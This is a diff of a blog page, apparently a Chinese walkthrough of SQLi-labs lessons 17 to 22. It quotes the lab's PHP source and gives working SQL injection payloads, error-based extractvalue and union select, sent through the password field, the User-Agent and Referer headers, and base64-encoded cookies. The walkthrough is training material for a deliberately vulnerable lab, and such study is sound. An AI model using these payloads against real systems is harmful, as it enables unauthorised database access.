 <p>我们知道在数据库中，字符串需要用引号包裹，因此我们用 <code>ctype_digit()</code> 检测是否为纯数字，如果为字符串则增加引号。
 这里的 <code>mysqli_real_escape_string()</code> 方法再次转义所有特殊字符：
 \x00, \n, \r, \, &lsquo;, &quot; and \x1a.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
@@ -1749,51 +924,11 @@ PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> �
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//making sure uname is not injectable
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>因此我们无法利用 <code>$uname</code> ，因为所有特殊字符都被转义导致无法逃逸，只能利用 <code>UPDATE</code> 语句中的 $passwd,用报错注入或者延时注入都可以实现，与 <code>SELECT</code> 一致</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="k">admin</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="mi">11</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- -&amp;submit=Submit
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-18">lesson 18</h4>
+</span></span></code></pre></div><p>因此我们无法利用 <code>$uname</code> ，因为所有特殊字符都被转义导致无法逃逸，只能利用 <code>UPDATE</code> 语句中的 $passwd,用报错注入或者延时注入都可以实现，与 <code>SELECT</code> 一致</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="o">=</span><span class="k">admin</span><span class="o">&amp;</span><span class="n">passwd</span><span class="o">=</span><span class="mi">11</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))-- -&amp;submit=Submit
+</span></span></span></code></pre></div><h4 id="lesson-18">lesson 18</h4>
 <p>根据提示IP 地址有所限制，判断可能是对于HTTP header有所要求，查看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
@@ -1820,36 +955,13 @@ PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> �
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>可以看到这里=$uname= <code>$passwd</code> 都进行了 <code>check_input()</code> 的过滤，因此只能另辟蹊径
+</span></span></code></pre></div><p>可以看到这里=$uname= <code>$passwd</code> 都进行了 <code>check_input()</code> 的过滤，因此只能另辟蹊径
 还有一条数据库操作语句是=INSERT= ，这里用到了 <code>$uagent</code>, <code>$IP</code> ，可以通过Burpsuite或者hackbar来修改header</p>
 <p>我们观察这条sql语句，我们能够修改的内容是$uagent的值，那么前后的两个=&rsquo;= 就需要闭合，然后利用报错注入，插入sql语句，然后使原sql语句报错，得到需要的结果</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">user</span><span class="o">-</span><span class="n">agent</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-19">lesson 19</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">user</span><span class="o">-</span><span class="n">agent</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
+</span></span></span></code></pre></div><h4 id="lesson-19">lesson 19</h4>
 <p>先读一下源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
@@ -1859,74 +971,15 @@ PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> �
 </span></span><span class="line"><span class="cl"><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$insert</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>与lesson-18的区别就是，这里的注入点在Referer,修改一下即可利用报错注入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-20">lesson 20</h4>
+</span></span></code></pre></div><p>与lesson-18的区别就是，这里的注入点在Referer,修改一下即可利用报错注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</span></span></code></pre></div><h4 id="lesson-20">lesson 20</h4>
 <p>根据提示，这道题是要利用cookie来进行注入，一看源代码发现比平时多出了好多，正好来练习一下读php</p>
 <p>第一次登陆
 cookie中没有 <code>uname</code> 的值，进入当前if
 用 <code>check_input</code> 过滤 <code>uname</code> 和 <code>passwd</code> 的值
 如果成功查询后，将查询到的username存到 <code>$cookee</code> 中，同时 <code>setcookie</code> 来设置 cookie</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]))</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
@@ -1972,52 +1025,13 @@ cookie中没有 <code>uname</code> 的值，进入当前if
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>POST之后，response的header中可以看到设置的set-cookie</p>
+</span></span></code></pre></div><p>POST之后，response的header中可以看到设置的set-cookie</p>
 <!-- raw HTML omitted -->
 <figure><img src="/ox-hugo/2022-04-22_15-35-18_screenshot.png" width="700px"/>
 </figure>
 
 <p>如果cookie有值，那么进入当前 else,接着 <code>$cookee</code> 的值进行查询，此处就是可以注入的地方</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span>
@@ -2050,67 +1064,30 @@ cookie中没有 <code>uname</code> 的值，进入当前if
 </span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Issue with your mysql: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>修改 cookie 即可利用注入</p>
+</span></span></code></pre></div><p>修改 cookie 即可利用注入</p>
 <figure><img src="/ox-hugo/2022-04-22_15-39-37_screenshot.png" width="700px"/>
 </figure>
 
 <h4 id="lesson-21">lesson 21</h4>
 <p>看源码，和上一题基本类似，只不过这里多了一步base64加密，同时使用 <code>（‘’）</code> 进行包裹</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=(&#39;</span><span class="si">$cookee</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>因此我们需要要先将我们的注入语句用base64加密，再注入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;)union select 1,2,database()-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><figure><img src="/ox-hugo/2022-04-22_15-54-20_screenshot.png" width="700px"/>
+</span></span></code></pre></div><p>因此我们需要要先将我们的注入语句用base64加密，再注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;)union select 1,2,database()-- -
+</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-04-22_15-54-20_screenshot.png" width="700px"/>
 </figure>
 
 <h4 id="lesson-22">lesson 22</h4>
 <p>读源码，与lesson 21类似，只不过改了包裹的方法 <code>&quot;&quot;</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$cookee1</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span> <span class="nv">$cookee</span><span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=</span><span class="si">$cookee1</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;union select 1,2,database()-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><figure><img src="/ox-hugo/2022-04-22_15-56-41_screenshot.png" width="700px"/>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;union select 1,2,database()-- -
+</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-04-22_15-56-41_screenshot.png" width="700px"/>
 </figure>
 
 
